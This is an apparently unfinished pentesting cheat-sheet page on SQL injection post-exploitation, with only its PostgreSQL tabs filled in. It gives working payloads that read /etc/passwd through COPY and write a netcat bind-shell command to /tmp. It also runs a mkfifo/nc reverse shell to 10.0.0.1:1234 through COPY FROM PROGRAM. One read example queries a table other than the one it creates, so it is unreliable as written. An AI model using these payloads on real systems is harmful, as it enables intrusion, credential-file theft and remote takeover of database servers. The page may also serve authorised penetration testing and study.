# Exploit Databases

## Theory

When exploiting SQL injection vulnerabilities, you may be able to read/write files on the operating system. In some case you will be able to execute arbitrary command

## Practice

{% hint style="info" %}
All queries on this page can be used with different techniques as UNION or Blind based attacks
{% endhint %}

### Read Files

{% tabs %}
{% tab title="MySQL" %}
```sql

```
{% endtab %}

{% tab title="MSSQL" %}
```sql

```
{% endtab %}

{% tab title="OracleSQL" %}
```sql

```
{% endtab %}

{% tab title="PostgreSQL" %}
Earlier versions of Postgres did not accept absolute paths in pg_read_file or pg_ls_dir. Newer versions (as of [this](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) commit) will allow reading any file/filepath for super users or users in the default_role_read_server_files group.
```sql
select pg_ls_dir('./');
select pg_read_file('PG_VERSION', 0, 200);
```

Aleternatilvly, we may use the `COPY` command
```sql
CREATE TABLE read_files(output text);
COPY read_files FROM ('/etc/passwd');
SELECT * FROM temp limit 1 offset 0;
```
{% endtab %}

{% tab title="SQLite" %}
```sql

```
{% endtab %}
{% endtabs %}

### Write Files

{% tabs %}
{% tab title="MySQL" %}
```sql

```
{% endtab %}

{% tab title="MSSQL" %}
```sql

```
{% endtab %}

{% tab title="OracleSQL" %}
```sql

```
{% endtab %}

{% tab title="PostgreSQL" %}
We may use the `COPY` command
```sql
COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
```

Or, using lo* commands
```sql
SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data
SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20
SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
```
{% endtab %}

{% tab title="SQLite" %}
```sql

```
{% endtab %}
{% endtabs %}


### Commmand Execution

{% tabs %}
{% tab title="MySQL" %}
```sql

```
{% endtab %}

{% tab title="MSSQL" %}
```sql

```
{% endtab %}

{% tab title="OracleSQL" %}
```sql

```
{% endtab %}

{% tab title="PostgreSQL" %}
To run system commands on Linux or Windows, we need to use the `PROGRAM` parameter.
```sql
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f’;
```
{% endtab %}

{% tab title="SQLite" %}
```sql

```
{% endtab %}
{% endtabs %}